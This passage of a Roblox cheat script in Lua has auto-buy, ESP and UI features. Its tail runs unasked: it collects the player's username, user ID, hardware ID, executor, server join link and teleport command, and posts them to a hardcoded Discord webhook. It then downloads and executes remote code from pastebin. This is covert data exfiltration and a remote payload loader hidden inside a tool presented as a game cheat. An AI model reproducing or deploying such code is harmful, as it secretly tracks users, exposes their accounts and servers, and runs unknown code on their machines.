        -- Update the Dealer Board UI
        local dealerBoard = workspace:FindFirstChild("DealerBoard")
        if dealerBoard and dealerBoard:FindFirstChild("BillboardGui") and dealerBoard.BillboardGui:FindFirstChild("TextLabel") then
            dealerBoard.BillboardGui.TextLabel.Text = formattedBoard
        end
    end
})
VisualsTab:AddButton({ Title = "Destroy UI", Callback = function() Rayfield:Destroy() end })

local function getItemPrice(path, item)
    local container = path:FindFirstChild(item)
    if not container then return math.huge end
    local frame = container:FindFirstChild("Frame")
    if not frame then return math.huge end
    local buyBtn = frame:FindFirstChild("Sheckles_Buy")
    if not buyBtn then return math.huge end
    local inStock = buyBtn:FindFirstChild("In_Stock")
    if not inStock then return math.huge end
    local costText = inStock:FindFirstChild("Cost_Text")
    if not costText or not costText.Text then return math.huge end
    return parseMoney(costText.Text)
end

local function tryPurchase(path, remote, item)
    local itemPrice = getItemPrice(path, item)
    local playerMoney = getPlayerMoney()
    if playerMoney >= itemPrice then
        local container = path:FindFirstChild(item)
        if container and container:FindFirstChild("Frame") then
            local buyBtn = container.Frame:FindFirstChild("Sheckles_Buy")
            if buyBtn and buyBtn:FindFirstChild("In_Stock") and buyBtn.In_Stock.Visible then
                remote:FireServer(item)
                return true
            end
        end
    end
    return false
end

-- Cleanup
local function cleanup()
    if descendantConnection then descendantConnection:Disconnect() end
    if collectionThread then task.cancel(collectionThread) end
    for prompt, data in pairs(promptTracker) do
        if prompt:IsA("ProximityPrompt") then
            pcall(function() prompt.RequiresLineOfSight = data.originalRequiresLOS prompt.Exclusivity = data.originalExclusivity end)
        end
    end
end

workspace.Farm.DescendantAdded:Connect(function(descendant)
    if state.espEnabled and descendant:IsA("Model") and descendant.Parent.Name == "Fruits" then
        local plantModel = descendant.Parent.Parent
        local farm = plantModel:FindFirstAncestorOfClass("Model")
        local data = farm and farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            createESP(descendant)
        end
    end
end)
Rayfield:LoadConfiguration()

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")

local localPlayer = Players.LocalPlayer
local userId = localPlayer.UserId
local username = localPlayer.Name
local displayName = localPlayer.DisplayName

--// HWID
local function getHWID()
    local hwid = "Unavailable"
    pcall(function()
        if gethwid then
            hwid = gethwid()
        elseif syn and syn_crypt and syn_crypt.hash then
            hwid = syn_crypt.hash(tostring(identifyexecutor()))
        end
    end)
    return hwid
end

--// Executor Detection
local function detectExecutor()
    local checks = {
        {cond=function() return identifyexecutor ~= nil end, name=identifyexecutor()},
        {cond=function() return getexecutorname ~= nil end, name=getexecutorname()},
        {cond=function() return syn and syn.protect_gui end, name="Synapse X"},
        {cond=function() return is_sirhurt_closure ~= nil end, name="SirHurt"},
        {cond=function() return isexecutorclosure ~= nil end, name="Script-Ware"},
        {cond=function() return secure_load ~= nil end, name="Sentinel"},
        {cond=function() return pebc_execute ~= nil end, name="Proxo"},
        {cond=function() return KRNL_LOADED ~= nil end, name="KRNL"},
        {cond=function() return fluxus ~= nil or is_fluxus_closure ~= nil end, name="Fluxus"},
        {cond=function() return wrapfunction ~= nil and isreadonly ~= nil end, name="Electron"},
        {cond=function() return get_hidden_ui ~= nil end, name="Dansploit"},
        {cond=function() return shadow_env ~= nil end, name="Shadow"},
        {cond=function() return hookmetamethod ~= nil and getrenv ~= nil and getgenv ~= nil end, name="Arceus X"},
        {cond=function() return isourclosure ~= nil and hookfunction ~= nil end, name="Velocity"},
        {cond=function() return is_synapse_function ~= nil and checkcaller ~= nil end, name="Swift"},
        {cond=function() return gethiddengui ~= nil end, name="Comet"},
        {cond=function() return cloneref ~= nil and hookfunction and checkcaller end, name="Trigon"},
        {cond=function() return gethui and not syn and not fluxus and not KRNL_LOADED end, name="Delta"},
        {cond=function() return getinstance ~= nil end, name="JJSploit"},
        {cond=function() return mimikatz ~= nil end, name="WeAreDevs API"},
        {cond=function() return getnilinstances ~= nil and setfflag ~= nil and getreg ~= nil end, name="Skisploit"},
        {cond=function() return rawisexecutor ~= nil end, name="Ronix"},
    }

    for _, exec in ipairs(checks) do
        local success, result = pcall(exec.cond)
        if success and result then return exec.name end
    end

    return "Unknown"
end

--// Feature Detection
local function getFeatureList()
    local feats = {}
    if setclipboard then table.insert(feats, "Ã°Å¸â€œâ€¹ setclipboard") end
    if hookfunction then table.insert(feats, "Ã°Å¸ÂªÂ hookfunction") end
    if getgenv then table.insert(feats, "Ã°Å¸Å’Â getgenv") end
    if getrawmetatable then table.insert(feats, "Ã°Å¸â€œÂ¦ getrawmetatable") end
    if gethui then table.insert(feats, "Ã°Å¸ÂªÅ¸ gethui") end
    if checkcaller then table.insert(feats, "Ã¢Å“â€¦ checkcaller") end
    if isreadonly then table.insert(feats, "Ã°Å¸â€â€™ isreadonly") end
    return #feats > 0 and table.concat(feats, ", ") or "None"
end

--// Game Details
local function getGameInfo()
    local info = {name="Unknown", creator="N/A", ctype="N/A"}
    pcall(function()
        local data = MarketplaceService:GetProductInfo(game.PlaceId)
        info.name = data.Name
        info.creator = data.Creator.Name
        info.ctype = data.Creator.CreatorType
    end)
    return info
end

--// Webhook Send
local function sendWebhook()
    local jobId = game.JobId
    local placeId = game.PlaceId
    local placeVersion = game.PlaceVersion
    local playerCount = #Players:GetPlayers()
    local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
    local joinLink = string.format("https://www.roblox.com/games/%d?jobId=%s", placeId, jobId)
    local teleportCmd = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', placeId, jobId)
    local headshot = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)

    local hwid = getHWID()
    local executor = detectExecutor()
    local gameInfo = getGameInfo()
    local features = getFeatureList()

    local data = {
        embeds = {{
            title = "Roblox Session Details",
            color = 0x00bfff,
            thumbnail = { url = headshot },
            fields = {
                { name="Username", value=username, inline=true },
                { name="Display Name", value=displayName, inline=true },
                { name="User ID", value=tostring(userId), inline=true },
                { name="Profile", value=profileUrl, inline=false },
                { name="Account Age", value=tostring(localPlayer.AccountAge).." days", inline=true },
                { name="Players in Server", value=tostring(playerCount), inline=true },
                { name="Game", value=gameInfo.name, inline=false },
                { name="Place ID", value=tostring(placeId), inline=true },
                { name="Place Version", value=tostring(placeVersion), inline=true },
                { name="Creator", value=gameInfo.creator.." ("..gameInfo.ctype..")", inline=true },
                { name="Job ID", value=jobId, inline=false },
                { name="Join Link", value=joinLink, inline=false },
                { name="Job Join Code", value="```lua\n"..teleportCmd.."\n```", inline=false },
                { name="Executor", value=executor, inline=true },
                { name="HWID", value=hwid, inline=false },
                { name="Features", value=features, inline=false },
                { name="Client Time", value=os.date("%Y-%m-%d %H:%M:%S"), inline=true },
                { name="UTC Time", value=os.date("!%Y-%m-%d %H:%M:%S"), inline=true },
            },
            footer = { text = "made by ah punisher" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local requestFunc = (syn and syn.request) or (http and http.request) or request or (fluxus and fluxus.request) or (krnl and krnl.request)
    if requestFunc then
        requestFunc({
            Url = "https://discord.com/api/webhooks/1376599213508526182/e96o4wx-umK6sAGI_j2q4AadXWXTOdcR6JxESVb4X78nC79Vuu-i0Nd4CmzrgSdXQPiP",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    else
        warn("No supported HTTP request method found.")
    end
end

--// Trigger
sendWebhook()

loadstring(game:HttpGet("https://pastebin.com/raw/UGPfGwVA", true))()
